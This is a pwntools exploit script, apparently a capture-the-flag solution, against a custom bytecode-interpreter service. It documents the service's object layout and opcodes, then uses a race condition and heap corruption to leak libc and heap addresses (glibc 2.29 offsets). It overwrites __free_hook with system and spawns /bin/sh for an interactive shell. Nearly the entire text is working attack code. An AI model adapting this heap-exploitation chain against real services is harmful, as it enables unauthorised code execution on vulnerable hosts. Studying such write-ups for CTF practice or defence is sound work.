###Race condition

from pwn import *

###Structure and Opcodes
'''
findnode -> find last node or target node

Node
    |   4   |   4   |   4   |   4   |
0x00|   HEADstrptr  |   -2  |       |
0x10|      next     |

Objects
Node
    |   4   |   4   |   4   |   4   |
0x00|    Dataptr    | inuse |       |
0x10|               |

Data(INT_Object)
    |   4   |   4   |   4   |   4   |
0x00|   TYPEstrptr  |      num      |

Data(STRING_Object)
    |   4   |   4   |   4   |   4   |
0x00|   TYPEstrptr  | STRINGMetaptr |

Data(STRING_Meta)
    |   4   |   4   |   4   |   4   |
0x00|   STRINGptr   |      size     |

Data(STRING)
    |   4   |   4   |   4   |   4   |
0x00|              ...(size)

Data(CHAR_Object)
    |   4   |   4   |   4   |   4   |
0x00|   TYPEstrptr  |C|     |       |


TYPES = [INT,STRING,CHAR]

Architecture
    Byte1 : Instruction Length(1,5,6 : 4bytes, 2,4 : 2bytes, 3 : 3bytes)
        1 : create  (possible race condition)
            Byte2 : idx
            Byte3 : Type
            Byte4 : Value(Size for String)
            if(LIST[idx]!=NULL)
                exit()
            LIST[idx] = malloc(0x10)
            LIST[0] = TYPES[Type]
            if Type is INT:
                LIST[1] = Value
            elif Type is STRING:
                LIST[1] = malloc(0x10)
                LIST[1][1] = 
        2 : delete  (strange)
            Byte2 : idx
        3 : edit
            Byte2 : idx
            Byte3 : Value(Size for String)
        4 : show
            Byte2 : idx
        5 :  integer/pointer manipulation
            !Both must be INT
            Byte2 : Opcode
            Byte3 : idx1
            Byte4 : idx2
            Opcode 1:
                Object[idx1]+=[Object[idx2]]
            Opcode 2:
                Object[idx1]-=Object[idx2]
            Opcode 3:
                Object[idx1]*=Object[idx2]
            Opcode 4:
                Object[idx1]/=Object[idx2] (Nop if Object[idx2]==0)
        6:
            Byte2 : Opcode
            Byte3 : idx1
            Byte4 : idx2
            Opcode 1:
                !Both must be CHAR
                Concat and make Object[idx1] into String
            Opcode 2:
                !Both must be STRING
                Concat and Reconstruct Object[idx1]
'''

###Util
def create(idx,Type,value):
    command = 1
    if value>=0x80:
        Type+=1
    if idx>=0x80:
        command+=1
    return p8(command)+p8(idx)+p8(Type)+p8(value)

def delete(idx):
    command = 2
    if idx>=0x80:
        command+=1
    return p8(command)+p8(idx)

def edit(idx,value):
    command = 3
    if value>=0x80:
        idx+=1
    if idx>=0x80:
        command+=1
    return p8(command)+p8(idx)+p8(value)

def show(idx):
    command = 4
    if idx>=0x80:
        command+=1
    return p8(command)+p8(idx)

def strops(idx1,idx2,Type):
    opcode = 3-Type
    if idx2>=0x80:
        idx1+=1
    if idx1>=0x80:
        opcode+=1
    return b'\x06'+p8(opcode)+p8(idx1)+p8(idx2)

###Constant
INT = 0
STRING = 1
CHAR = 2

###Addr
#  libc2.29
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x1e75a8
system_offset = 0x52fd0

###Exploit
while True:
    r = remote('127.0.0.1',10105)

    code = create(127,STRING,0x28)+\
           create(0,STRING,0xff)+\
           show(127)+\
           edit(0,0xff)+\
           b''.join([strops(0,0,STRING) for i in range(4)])+\
           create(1,STRING,0x1)+\
           edit(1,1)+\
           show(1)+\
           b''.join([create(i+2,STRING,0x1) for i in range(5)])+\
           b''.join([delete(i+2) for i in range(5)])+\
           delete(1)+\
           edit(127,1)+\
           create(1,STRING,0x1)+\
           edit(1,1)+\
           show(1)+\
           edit(127,0x28)+\
           create(2,STRING,0x10)+\
           create(3,STRING,0x1)+\
           edit(2,0x10)+\
           b''.join([create(i+4,INT,0)+\
                     strops(2,3,STRING)+\
                     edit(1,1)+\
                     edit(2,0x10)+\
                     show(i+4)+\
                     edit(i+4,0x8)+\
                     edit(2,0x10)
                     for i in range(60)])

    r.sendafter('Code :> ',code)
    r.sendafter(']\n','a'*0xff)
    r.send(b'\xa0')
    unsorted_bin_addr = u64(r.recvline()[12:-2]+b'\x00\x00')
    libc_base = unsorted_bin_addr-unsorted_bin_offset
    print(hex(libc_base))

    r.send('\x00')
    r.send('a')
    heap_addr = (u64(r.recvline()[12:-2]+b'\x00\x00')-0x2130)&0xfffffffffffff000
    print(hex(heap_addr))

    r.send(b'INT\x00\x00\x00\x00\x00STRING\x00\x00CHAR\x00\x00\x00\x00'+p64(libc_base+free_hook_offset)+p64(0x8))
    r.send('a'*0x10)
    FOUND = False
    for i in range(60):
        r.send('\x00')
        r.send(p64(heap_addr+0x2418)+p64(heap_addr+0x2428))
        try:
            res = r.recvline(timeout=1)
            print(i,res)
            if b'INT' not in res:
                if b'STRING' in res:
                    FOUND=True
                break
        except:
            break
        r.send('a'*0x10)
    if FOUND is False:
        r.close()
        continue
    print('FOUND!')
    sleep(0.5)
    r.send(p64(libc_base+system_offset))
    r.send('/bin/sh\x00'.ljust(0x10,'\x00'))
    sleep(0.1)
    
    r.interactive()
    break
